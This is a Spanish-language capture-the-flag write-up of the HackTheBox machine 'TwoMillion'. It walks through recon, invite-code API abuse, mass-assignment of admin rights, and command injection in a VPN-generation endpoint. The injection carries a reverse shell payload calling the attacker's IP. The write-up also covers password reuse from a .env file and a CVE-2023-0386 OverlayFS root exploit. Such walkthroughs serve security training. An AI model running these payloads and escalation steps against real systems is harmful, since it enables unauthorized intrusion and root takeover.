Propiedades:
- OS: Linux
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #api-abuse #overlay-fs #CVE-2023-038 #javascript-deobfuscation

![](assets/Pasted%20image%2020251230213717.png)
## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/twomillion]
└─$ ping -c 1 10.129.229.66
PING 10.129.229.66 (10.129.229.66) 56(84) bytes of data.
64 bytes from 10.129.229.66: icmp_seq=1 ttl=63 time=89.3 ms

--- 10.129.229.66 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 89.303/89.303/89.303/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/twomillion]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vv 10.129.229.66 -oG nmap/allPorts

Host is up, received user-set (0.090s latency).
Scanned at 2025-12-30 21:39:09 CST for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

- Puertos 22 SSH y 80 HTTP abiertos

Sobre los puertos abiertos realizo un segundo escaneo con nmap mas profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/twomillion]
└─$ sudo nmap -p 22,80 -sC -sV -Pn -n -vv 10.129.229.66 -oN nmap/target

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx
|_http-title: Did not follow redirect to http://2million.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSH OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
- Puerto 80 HTTP nginx con dominio **2million.htb**

Metí el dominio al `/etc/hosts`

```bash
10.129.229.66 2million.htb
```
## Enumeración

### Puerto 80 HTTP

Podemos ver que la pagina es una version de HackTheBox vieja

![](assets/Pasted%20image%2020251230214428.png)

Para registrarse es necesario "hackear" el codigo de invitación.

![](assets/Pasted%20image%2020251230220414.png)

**Tecnologias Web.**

Wappalyzer detecta lo siguiente:

- `PHP` como lenguaje.
- `Nginx` como Servidor Web y Reverse Proxy

![](assets/Pasted%20image%2020251230214613.png)

**Fuzzing de Directorios.**

Con **`ffuf`** realicé fuzzing para enumerar los recursos disponibles en la aplicación web. Durante este proceso observé múltiples respuestas **`403 Forbidden`**, lo que sugiere la existencia de **directorios accesibles pero con restricciones**, dentro de los cuales podrían existir recursos internos no directamente expuestos.

Debido a esto, utilicé **`feroxbuster`**, una herramienta que permite realizar **fuzzing recursivo**, facilitando la enumeración de archivos y subdirectorios dentro de estas rutas protegidas.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/twomillion]
└─$ feroxbuster -u http://2million.htb/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://2million.htb/
 🚩  In-Scope Url          │ 2million.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       11w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://2million.htb/logout => http://2million.htb/
200      GET       27l      201w    15384c http://2million.htb/images/favicon.png
200      GET        1l        8w      637c http://2million.htb/js/inviteapi.min.js
405      GET        0l        0w        0c http://2million.htb/api/v1/user/register
401      GET        0l        0w        0c http://2million.htb/api
405      GET        0l        0w        0c http://2million.htb/api/v1/user/login
200      GET       80l      232w     3704c http://2million.htb/login
200      GET       96l      285w     3859c http://2million.htb/invite
302      GET        0l        0w        0c http://2million.htb/home => http://2million.htb/
200      GET      245l      317w    28522c http://2million.htb/images/logofull-tr-web.png
200      GET      260l      328w    29158c http://2million.htb/images/logo-transparent.png
200      GET       46l      152w     1674c http://2million.htb/404
200      GET       13l     2458w   224695c http://2million.htb/css/htb-frontend.css
200      GET       13l     2209w   199494c http://2million.htb/css/htb-frontpage.css
200      GET        5l     1881w   145660c http://2million.htb/js/htb-frontend.min.js
200      GET       94l      293w     4527c http://2million.htb/register
200      GET        8l     3162w   254388c http://2million.htb/js/htb-frontpage.min.js
200      GET     1242l     3326w    64952c http://2million.htb/
405      GET        0l        0w        0c http://2million.htb/api/v1/invite/verify
```

- Nos puede interesar el archivo `http://2million.htb/js/inviteapi.min.js`

Por lo cual podemos tirarle un curl para ver que es.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/twomillion]
└─$ curl http://2million.htb/js/inviteapi.min.js

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

- Al parecer es codigo javascript ofuscado, lo podemos notar gracia a `eval(function(p,a,c,k,e,d)`

Podemos desofuscar el codigo redefiniendo la función `eval()` para que imprimir el codigo.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/twomillion]
└─$ cat unpack.js
eval = function (x) {

        console.log(x);
}

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

Ejecutamos nuestro `unpack.js` y podemos ver lo siguiente.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/twomillion]
└─$ node unpack.js

function verifyInviteCode(code){var formData={"code":code};$.ajax({type:"POST",dataType:"json",data:formData,url:'/api/v1/invite/verify',success:function(response){console.log(response)},error:function(response){console.log(response)}})}function makeInviteCode(){$.ajax({type:"POST",dataType:"json",url:'/api/v1/invite/how/to/generate',success:function(response){console.log(response)},error:function(response){console.log(response)}})}
```

- Existe el endpoint `/api/v1/invite/how/to/generate` al cual le puedes realizar una petición por el metodo POST para generar un codigo.

Le hacemos la petición al endpoint.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/twomillion]
└─$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

- Podemos ver que nos genero un mensaje pero codificado en  `ROT13`

Decodificamos el mensaje dentro de **data** y vemos lo siguiente

![](assets/Pasted%20image%2020251230222658.png)

- Otro endpoint `/api/v1/invite/generate` al cual le podemos hacer una petición por POST para generar un codigo.

Le realizamos la petición y vemos lo siguiente:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/twomillion]
└─$ curl -X POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"SERJSEotUVRDNzQtQTg4NkItNlFJMVI=","format":"encoded"}}
```

- Vemos el siguiente codigo mensaje **SERJSEotUVRDNzQtQTg4NkItNlFJMVI=** codificado en base64

Lo decodificamos y obtenemos el codigo.:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/twomillion]
└─$ echo "SERJSEotUVRDNzQtQTg4NkItNlFJMVI=" | base64 -d
HDIHJ-QTC74-A886B-6QI1R
```

Ahora tenemos un codigo para registrarnos. Por lo cual me cree una cuenta.

![](assets/Pasted%20image%2020251230222951.png)

Una vez logeados podemos ver el dashboard.

![](assets/Pasted%20image%2020251230223140.png)

## Intrusion.

Ahora que ya estamos autenticados podemos enumerar la api.

- Mande una petición a la raíz de la api y se me indico otro endpoint `/api/v1`

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/twomillion]
└─$ curl -X GET http://2million.htb/api -b "PHPSESSID=62pugb5n1tisj5dh219263up6e" | jq .
{
  "/api/v1": "Version 1 of the API"
}
```

Le tire otra petición a dicho endpoint y me mostro lo siguiente:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/twomillion]
└─$ curl -X GET http://2million.htb/api/v1 -b "PHPSESSID=62pugb5n1tisj5dh219263up6e" | jq .

{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

- Es una lista de los endpoints de la api.

El endpoint me interesa es el siguiente:

```
"/api/v1/admin/settings/update"
```

Podemos una petición via PUT con un JSON vacío a ver que nos regresa.

```bash
┌──(wndr㉿wndr)-[~]
└─$ curl -X PUT http://2million.htb/api/v1/admin/settings/update -b "PHPSESSID=0sc1a2u4gkappa15o67mg780gn" -H "Content-Type: application/json" -d '{}' | jq .

{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

Le volví a tirar una petición pero ahora pasándole mi email con el que me registre en el json:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/twomillion]
└─$ curl -X PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -d '{"email": "pepe@pepe.com"}' -b "PHPSESSID=0sc1a2u4gkappa15o67mg780gn" | jq .
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

Ahora, me pide un parametro `is_admin`, supongo que es este el parametro que puedo actualizar para convertir mi usuario en admin, por lo cual trato de mandar ese parametro como true.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/twomillion]
└─$ curl -X PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -d '{"email": "pepe@pepe.com", "is_admin": true}' -b "PHPSESSID=0sc1a2u4gkappa15o67mg780gn" | jq .
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```

Se me indica que el booleano tiene  que ser en formato `0 1` por lo cual simplemente le coloco un 1.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/twomillion]
└─$ curl -X PUT http://2million.htb/api/v1/admin/settings/update -H "Content-Type: application/json" -d '{"email": "pepe@pepe.com", "is_admin": 1}' -b "PHPSESSID=0sc1a2u4gkappa15o67mg780gn" | jq .

{
  "id": 13,
  "username": "pepe",
  "is_admin": 1
}
```

Para verificar si me volví usuario admin puedo tirarle una petición al endpoint `/api/v1/admin/auth`.

```bash
┌──(wndr㉿wndr)-[~]
└─$ curl -X GET http://2million.htb/api/v1/admin/auth -b "PHPSESSID=0sc1a2u4gkappa15o67mg780gn" | jq .
{
  "message": true
}
```

Ahora que soy admin puedo tratar de probar los endpoints `/admin`.

- El primero que probé fue `/api/v1/admin/vpn/generate`

```bash
┌──(wndr㉿wndr)-[~]
└─$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{}' -b "PHPSESSID=0sc1a2u4gkappa15o67mg780gn" | jq .

{
  "status": "danger",
  "message": "Missing parameter: username"
}

```

- Me pide un **usuario**

Le mande mi usuario y al parecer se genera correctamente una key.

```bash
┌──(wndr㉿wndr)-[~]
└─$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{"username": "pepe"}' -b "PHPSESSID=0sc1a2u4gkappa15o67mg780gn"
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
```

Probé tratando de inyectar un comando en el parametro **username** y funciono correctamente.

```bash
┌──(wndr㉿wndr)-[~]
└─$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{"username": "pepe; id #"}' -b "PHPSESSID=0sc1a2u4gkappa15o67mg780gn"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Por lo cual ahora puedo entablarme una reverse-shell.

- Me pongo en escucha.

```bash
┌──(wndr㉿wndr)-[~]
└─$ sudo nc -nlvp 9001
listening on [any] 9001 ...
```

- Envió la petición.

```bash
┌──(wndr㉿wndr)-[~]
└─$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{"username": "pepe; bash -c \"bash -i >& /dev/tcp/10.10.15.110/9001 0>&1\" #"}' -b "PHPSESSID=0sc1a2u4gkappa15o67mg780gn"
```

- Recibo la conexión.

```bash
┌──(wndr㉿wndr)-[~]
└─$ sudo nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.15.110] from (UNKNOWN) [10.129.229.66] 52642
bash: cannot set terminal process group (1095): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ whoami
whoami
www-data
www-data@2million:~/html$
```

## Escalada a usuario admin.

Al hecharle un vistaso al `/etc/passwd` note un usuario llamado admin.

En mi actual directorio habia un archivo `.env` que corresponden a las variables de entorno de la web.

```bash
www-data@2million:~/html$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Dec 31 06:30 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Dec 31 06:30 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
```

Al mirar el `.env` me encuentro credenciales para la base de datos del el usuario **admin**

```bash
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1                                                                                                                                                DB_DATABASE=htb_prod                                                                                                                                             DB_USERNAME=admin                                                                                                                                                DB_PASSWORD=SuperDuperPass123
```

Puedo tratar de reutilizar dicha contraseña para migrar al usuario **admin**.

```bash
su admin
Password: SuperDuperPass123

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:/var/www/html$ id                                  id
id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
admin@2million:/var/www/html$
```

- Funciona correctamente y ahora soy el usuario admin.

Probé las credenciales para la base de datos `mysql` y efectivamente me funciono y pude ver hashes de contraseña que no me sirvieron de nada.

```bash
admin@2million:/var/www/html$ mysql -u admin -p'SuperDuperPass123' -p htb_prod
Enter password:
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 275137
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [htb_prod]> show tables;
+--------------------+
| Tables_in_htb_prod |
+--------------------+
| invite_codes       |
| users              |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [htb_prod]> select * from users;
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| id | username     | email                      | password                                                     | is_admin |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
| 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
| 13 | pepe         | pepe@pepe.com              | $2y$10$Sj7N5eYdz8wpy9qAUXB3Reyo56jVDiRTfL1MP7BZrGjqM/8t8xe3K |        1 |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
3 rows in set (0.001 sec)
```

Las credenciales también sirven para `ssh` y se me indica que tengo un mail

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/twomillion]
└─$ ssh admin@10.129.229.66
admin@10.129.229.66's' password:

You have mail.
Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$
```

Podemos ver el correo en la ruta estandar `/var/mail/admin`.

```bash
admin@2million:~$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

- El correo nos indica que el Linux Kernel actual tiene una vulnerabilidad relacionada a OverlayFS.

Podemos ver la version del Kernel de linux.

```bash
admin@2million:~$ uname -r
5.15.70-051570-generic
```

Ya sea que busquemos exploit por la version del kernel o por overlay-fs vamos a llegar al mismo [CVE-2023-0386](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/)

!!! info
    El problema está relacionado con **OverlayFS** y la forma en que mueve archivos entre sus capas. Para explotar esta vulnerabilidad, un atacante primero crea un sistema de archivos **FUSE (File System in User Space)** y dentro de él añade un binario que aparenta pertenecer al usuario **root (UID 0)** y que tiene activado el bit **SetUID**.

    Normalmente, esto no debería ser peligroso porque los sistemas de archivos FUSE suelen montarse con la opción **`nosuid`**, lo que impide que los binarios SetUID se ejecuten con privilegios elevados.

    Sin embargo, debido a un error en **OverlayFS**, cuando ese archivo es copiado desde el sistema de archivos FUSE hacia el sistema principal durante la operación **`copy_up`**, el kernel **no valida correctamente el propietario ni los permisos** del archivo. Como resultado, el binario mantiene tanto su propietario (`root`) como el bit SetUID, permitiendo que un usuario sin privilegios ejecute código como **root**.

Vamos a utilizar el siguiente [PoC](https://github.com/xkaneiki/CVE-2023-0386). Para el PoC necesitaremos 2 terminales.

Nos bajaremos el ZIP y y compilaremos los binarios..

```bash
admin@2million:/tmp$ unzip CVE-2023-0386-main.zip
Archive:  CVE-2023-0386-main.zip
c4c65cefca1365c807c397e953d048506f3de195
creating: CVE-2023-0386-main/
inflating: CVE-2023-0386-main/Makefile
...
inflating: CVE-2023-0386-main/test/mnt.c

admin@2million:/tmp$ cd CVE-2023-0386-main/

admin@2million:/tmp/CVE-2023-0386-main$ make all
```

En la primer a terminal ejecutamos lo siguiente: 

```bash
admin@2million:/tmp/CVE-2023-0386-main$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
[+] readdir
[+] getattr_callback
/file
```

Y en la segunda terminal ejecutamos `./exp` y migramos a root.

```bash
admin@2million:/tmp/CVE-2023-0386-main$ ./exp

uid:1000 gid:1000
[+] mount success total 8 
drwxrwxr-x 1 root root 4096 Jun 2 23:11 . 
drwxrwxr-x 6 root root 4096 Jun 2 23:11 .. 
-rwsrwxrwx 1 nobody nogroup 16096 Jan 1 1970 
file [+] exploit success! To run a command as administrator (user "root"), use "sudo <command>". See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386-main# id
uid=0(root) gid=0(root) groups=0(root), 1000(admin)
```

***PWNED***

![](assets/Pasted%20image%2020251231013800.png)

